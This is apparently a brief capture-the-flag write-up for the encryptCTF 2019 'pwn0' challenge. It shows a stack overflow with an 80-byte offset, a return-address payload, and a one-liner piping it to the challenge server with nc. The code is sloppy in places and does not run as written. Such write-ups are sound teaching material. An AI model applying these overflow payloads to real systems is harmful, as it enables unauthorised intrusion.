# Pwn0

![pwn0_chall](../IMG/pwn0_chall.png)

It's just a programme which asks : "How's the josh?" and answer : "Your josh is low! Bye!"

If we put many number we got : 

![pwn0_proof1](../IMG/pwn0_proof1.png)

![pwn0_proof2](/home/taiqui/Documents/WriteUp/encryptCTF_april_2019/IMG/pwn0_proof2.png)

so at index 80, we overwrite EIP registers.

so we have our offset, need what's inject !

in disassemble main programme, we can see :

![pwn0_proof3](../IMG/pwn0_proof3.png)

so we just call the **movl** previous instruction.

so our injection seems like : 

```python
offset = "A"*80
payload = "\x57\x85\x04\x08"
```

```bash
python -c 'print offset+payload'|nc 104.154.106.182:1234
and get the flag !
![pwn0_proof4](../IMG/pwn0_proof4.png)























```
